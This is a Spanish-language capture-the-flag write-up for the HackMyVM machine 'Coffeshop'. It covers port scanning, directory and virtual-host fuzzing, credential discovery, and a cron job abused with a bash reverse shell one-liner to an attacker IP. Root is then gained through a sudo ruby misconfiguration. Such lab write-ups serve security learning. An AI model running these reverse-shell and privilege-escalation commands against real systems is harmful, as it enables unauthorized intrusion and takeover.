---
layout: default
title: Coffeshop
parent: HackMyVM
grand_parent: Writeups
---

# Coffeshop
{: .no_toc }

## Table of contents
{: .no_toc .text-delta }

1. TOC
{:toc}

---

## Enumeracion

Iniciamos con un escaneo de nmap donde encontraremos el puerto 22 y 80

```ruby
nmap -sS -n -Pn -T4 --open -p- 192.168.1.81
```

- sS: haga un TCP SYN Scan el cual hace un escaneo sigiloso sin completar las conexiones TCP, responde con un SYN/ACK si el puerto esta abierto

 - n: para que no haga resolucion DNS y tarde menos el escaneo

 - Pn: para evitar el descubrimiento de hosts

 - open: para que solo muestre los puertos abiertos

 - -p-: para que escanee todo el rango de puertos

 ```ruby
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
```

### Directory Fuzzing

Haciendo uso de gobuster para enumerar directorios mediante fuerza bruta, nos encontramos con **shop**

```ruby
gobuster dir -u http://192.168.1.84/ -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 100
```

```ruby
/shop                 (Status: 301) [Size: 311] [--> http://192.168.1.84/shop/]
```

### Explorando el sitio web

En el sitio web principal nos encontramos el nombre de un dominio **midnight.coffee**, es posible que se este aplicando virtual hosting y lo tengamos que agregar al **/etc/host** para que resuelva

```bash
echo "<IP>     midnight.coffee" | tee -a /etc/hosts
```

Si regresamos el sitio web y entramos el recurso **/shop**, nos mostrara un encabezado con varias opciones, donde tendremos un login

![](/assets/img/coffeshop/2.png)

En este punto intente probar con SQLi, NoSQLi, Type Juggling pero nada de eso me funciono, asi que recurri a enumerar subdominios, recordemos que agregamos un dominio al /etc/hosts, por lo cual debemos de hacer el fuzzing con ese dominio, usaremos wfuzz en modo vhost y descubriremos **dev**

```ruby
wfuzz -u 'http://midnight.coffee' -H 'Host: FUZZ.midnight.coffee' -t 100 -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt --hh 1690
```

```ruby
200        71 L     152 W      1738 Ch     "dev"
```

Tambien hay que agregarlo el /etc/hosts

```bash
echo "<IP>     dev.midnight.coffee" | tee -a /etc/hosts
```

Al entrar al sitio, podremos ver las credenciales del login

![](/assets/img/coffeshop/3.png)

![](/assets/img/coffeshop/4.png)

## Movimiento lateral: tuna -> shopadmin

### user.txt (via no intencionada)

Durante la enumeracion, pude encontrar que en el directorio /opt existe un archivo de ruby que ocuparemos mas adelante

```ruby
-rw-r--r--  1 root root   27 Jan  3 14:00 shop.rb
```
Tambien intente enumerar binarios SUID, permisos a nivel de sudoers y nada, explore un poco mas y encontre en el directorio home de **shopadmin** tiene permisos de ejecucion, por lo que podemos entrar en el pero no listar contenido

![](/assets/img/coffeshop/5.png)

Asi que se me ocurrio leer el archivo **user.txt** y si tengo suerte y existe tener la flag, y si funciono

![](/assets/img/coffeshop/6.png)

### user.txt (via intencionada)

Si mostramos el archivo **.viminfo** podemos ver que se crearon y/o editaron varias cosas, como el crontab y el archivo **/tmp/uwu.sh** 

![](/assets/img/coffeshop/7.png)

Si mostramos las tareas cron, tenemos una que se ejecuta como el usuario **shopadmin**

```ruby
* * * * * /bin/bash /home/shopadmin/execute.sh
```

Al ver su contenido, podemos ver que esta ejecutando cualquier archivo **.sh** del directorio **/tmp**, por lo cual podemos crear uno que nos envie una reverse shell, en mi caso usare el tipico one liner de bash

```bash
#!/usr/bin/env bash
bash -i >& /dev/tcp/<IP>/443 0>&1
```

Despues de 1 minuto, nos llegara una shell y ya tendremos la flag se user por la via intencionada

![](/assets/img/coffeshop/8.png)

## Escalada de privilegios

Si mostramos los permisos de nivel de sudoers, podemos ver que podemos ejecutar cualquier cosa con ruby y el archivo **shop.rb**

```ruby
User shopadmin may run the following commands on coffee-shop:
    (root) NOPASSWD: /usr/bin/ruby * /opt/shop.rb
```

Al buscar en **GFTOBins** obtenemos que podemos hacernos root ejecutando **ruby -e 'exec "/bin/sh"'**, si lo probamos asi no funcionada, por lo que debemos de indicarle el archivo **/opt/shop.rb**

```ruby
sudo ruby -e 'exec "/bin/bash"'  /opt/shop.rb
```

Y ya seremos root

![](/assets/img/coffeshop/9.png)

Eso ha sido todo, gracias por leer ❤